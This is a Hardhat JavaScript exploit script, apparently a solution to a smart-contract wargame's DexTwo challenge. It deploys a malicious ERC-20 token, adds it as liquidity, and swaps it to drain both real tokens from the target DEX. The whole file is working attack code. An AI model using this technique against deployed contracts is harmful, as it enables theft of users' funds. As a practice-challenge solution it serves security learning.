const { ethers } = require("hardhat")

const dexTwoInstanceAddress = "0xa19f0698C5108B57be92775da146a2Be485cfd66"

async function main() {
  /* Get signer */

  const accounts = await ethers.getSigners()
  const deployer = accounts[0]

  /* Getting the Dex contract */

  const DexTwo = await ethers.getContractFactory("DexTwo")
  const dexTwo = await DexTwo.attach(dexTwoInstanceAddress)

  /* Approving tokens for transfer */

  console.log("Approving Dex Two's tokens for transfer")
  const approve = await dexTwo.approve(dexTwoInstanceAddress, 500)
  await approve.wait(1)

  /* Setting up Malicious Token (Peso Argentino) for attack */

  console.log("Deploying Peso Argentino (malicious token)...")
  await deployments.fixture("dextwo")
  const pesoArgentino = await ethers.getContract("PesoArgentino", deployer)

  console.log("Approving Peso Argentino to be used from deployer's address")
  const approvePesoArgentinoDeployer = await pesoArgentino.approve(deployer.address, 500)
  await approvePesoArgentinoDeployer.wait(1)

  console.log("Approving Peso Argentino to be used from Dex Two's address")
  const approvePesoArgentinoDex = await pesoArgentino.approve(dexTwoInstanceAddress, 500)
  await approvePesoArgentinoDex.wait(1)

  /* Add Malicious Token as Dex Two's liquidity */

  const pesoArgentinoAddress = await pesoArgentino.address
  console.log("Peso Argentino Address is: " + pesoArgentinoAddress)

  console.log("Adding Peso Argentino as liquidity to Dex Two")

  const transferToDex = await pesoArgentino.transferFrom(
    deployer.address,
    dexTwoInstanceAddress,
    100
  )
  await transferToDex.wait(1)

  const dexBalancePesoArgentino = await dexTwo.balanceOf(
    pesoArgentinoAddress,
    dexTwoInstanceAddress
  )
  console.log("Dex Two has now: " + dexBalancePesoArgentino + " Peso Argentino")

  /* Swap Malicious Token for Token 1 and Token 2 */

  const token1 = await dexTwo.token1()
  const token2 = await dexTwo.token2()

  console.log("Swapping Peso Argentino for 100 Token 1")
  const swapToken1 = await dexTwo.swap(pesoArgentinoAddress, token1, 100)
  await swapToken1.wait(1)
  const dexBalanceToken1 = await dexTwo.balanceOf(token1, dexTwoInstanceAddress)
  console.log("Dex Two has now: " + dexBalanceToken1 + " Token 1")

  console.log("Swapping Peso Argentino for 100 Token 2")
  const swapToken2 = await dexTwo.swap(pesoArgentinoAddress, token2, 200)
  await swapToken2.wait(1)
  const dexBalanceToken2 = await dexTwo.balanceOf(token2, dexTwoInstanceAddress)
  console.log("Dex Two has now: " + dexBalanceToken2 + " Token 2")

  console.log("Pwned!")
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
